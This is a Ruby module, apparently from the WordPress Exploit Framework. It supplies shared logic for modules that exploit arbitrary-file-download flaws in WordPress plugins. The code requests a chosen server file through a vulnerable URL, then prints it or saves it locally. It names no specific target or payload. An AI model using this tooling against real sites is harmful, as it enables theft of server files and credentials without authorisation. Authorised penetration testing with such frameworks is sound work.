# Provides reusable functionality for file download modules.
module Wpxf::WordPress::FileDownload
  include Wpxf

  # Initialize a new instance of {FileDownload}
  def initialize
    super
    @info[:desc] = 'This module exploits a vulnerability which allows you to '\
                   'download any arbitrary file accessible by the user the web server is running as.'

    register_options([
      StringOption.new(
        name: 'remote_file',
        desc: "The path to the remote file (relative to #{working_directory})",
        required: true,
        default: default_remote_file_path
      ),
      StringOption.new(
        name: 'export_path',
        desc: 'The path to save the file to',
        required: false
      )
    ])
  end

  # @return [String] the working directory of the vulnerable file.
  def working_directory
    nil
  end

  # @return [String] the default remote file path.
  def default_remote_file_path
    nil
  end

  # @return [String] the URL of the vulnerable file used to download remote files.
  def downloader_url
    nil
  end

  # @return [Hash] the params to be used when requesting the download file.
  def download_request_params
    nil
  end

  # @return [Hash, String] the body to be use when requesting the download file.
  def download_request_body
    nil
  end

  # @return [Symbol] the HTTP method to use when requesting the download file.
  def download_request_method
    :get
  end

  # @return [String] the path to the remote file.
  def remote_file
    normalized_option_value('remote_file')
  end

  # @return [String] the path to save the file to.
  def export_path
    normalized_option_value('export_path')
  end

  # Run the module.
  # @return [Boolean] true if successful.
  def run
    raise 'A value must be specified for #working_directory' unless working_directory

    return false unless super
    res = request_file

    if res.nil? || res.timed_out?
      emit_error 'Request timed out, try increasing the http_client_timeout'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    if export_path.nil?
      emit_success "Result: \n#{res.body}"
    else
      emit_success "Downlaoded file to #{export_path}"
    end

    true
  end

  private

  def request_file
    if export_path.nil?
      emit_info 'Requesting file...'
      return execute_request(
        method: download_request_method,
        url: downloader_url,
        params: download_request_params,
        body: download_request_body,
        cookie: session_cookie
      )
    else
      emit_info 'Downloading file...'
      return download_file(
        url: downloader_url,
        method: download_request_method,
        params: download_request_params,
        local_filename: export_path,
        body: download_request_body,
        cookie: session_cookie
      )
    end
  end
end
